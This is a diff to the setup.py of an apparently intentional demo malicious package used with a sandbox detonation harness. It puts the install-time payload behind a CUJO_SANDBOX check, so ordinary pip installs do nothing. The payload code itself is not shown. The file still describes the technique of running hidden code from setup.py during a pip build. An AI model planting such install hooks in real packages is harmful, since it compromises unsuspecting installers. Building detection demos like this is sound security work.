@@ -7,12 +7,14 @@ anything with this package.
 
 WHERE THE PAYLOAD RUNS
 ----------------------
-The payload runs at the top level of this setup.py, which is executed by the
-build/install tooling itself: pip's PEP 517 build runs setup.py in a subprocess
-to produce the wheel, and `python setup.py install` runs it too. So a normal
-`pip install git+https://.../evil-package` detonates it -- which is how the demo
-PR delivers it. Importing the installed `evil_package` module never runs any of
-this; setup.py is not imported by the package, only executed at build/install.
+The payload is defined at the top level of this setup.py (executed by the
+build/install tooling: pip's PEP 517 build runs setup.py in a subprocess, and
+`python setup.py install` runs it too). It is gated behind the CUJO_SANDBOX
+environment variable: it fires ONLY when CUJO_SANDBOX is set, which the sniff.py
+detonation harness does before installing. A normal `pip install` by anyone
+else is completely INERT -- no network, no file reads, no writes. Importing the
+installed `evil_package` module never runs any of this either; setup.py is not
+imported by the package, only executed at build/install.
 """
 
 import os
@@ -66,12 +68,17 @@ def _run_demo_payload():
         pass
 
 
-# Fire the payload when this setup.py is executed by the build/install tooling.
-# The whole call is guarded so a failure here can never break the install.
-try:
-    _run_demo_payload()
-except Exception:
-    pass
+# SAFETY GATE: the payload fires ONLY when the CUJO_SANDBOX environment variable
+# is set. The sniff.py detonation harness sets it before installing, so the demo
+# still works; a normal `pip install` by anyone else is completely inert -- it
+# never touches the network, reads no files, and writes nothing. This keeps a
+# bystander who installs the package outside a sandbox fully safe.
+# The whole call is additionally guarded so a failure here can never break the install.
+if os.environ.get("CUJO_SANDBOX"):
+    try:
+        _run_demo_payload()
+    except Exception:
+        pass
 
 
 setup(
